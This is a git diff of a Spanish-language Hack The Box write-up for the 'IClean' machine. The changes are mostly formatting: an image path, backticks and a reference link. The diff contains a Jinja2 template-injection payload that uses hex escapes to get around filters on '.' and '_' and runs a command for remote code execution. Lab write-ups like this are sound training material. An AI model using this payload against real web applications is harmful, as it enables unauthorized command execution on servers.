@@ -5,7 +5,7 @@ excerpt: "IClean es una máquina de la plataforma Hack The Box de dificultad med
 date: 2024-08-21
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-late/late.webp
+  teaser: /assets/images/htb-writeup-IClean/IClean.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -307,14 +307,15 @@ Después intenté enviar un payload para ejecutar comandos, pero recibí un erro
 
 ![](/assets/images/htb-writeup-IClean/bburp.png)
 
-Para lograr la ejecución remota de comandos utilice el sig. payload en el cual se realizan algunos bypass de caracteres como . y _
+Para lograr la ejecución remota de comandos utilice el sig. payload en el cual se realizan algunos bypass de caracteres como `.` y `_`
 
 ```bash
+
 {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+
 ```
 
-Referencia: https://hackmd.io/@Chivato/HyWsJ31dI 
-
+Referencia: [HackMD](https://hackmd.io/@Chivato/HyWsJ31dI)
 
 ![](/assets/images/htb-writeup-IClean/burp3.png)
 
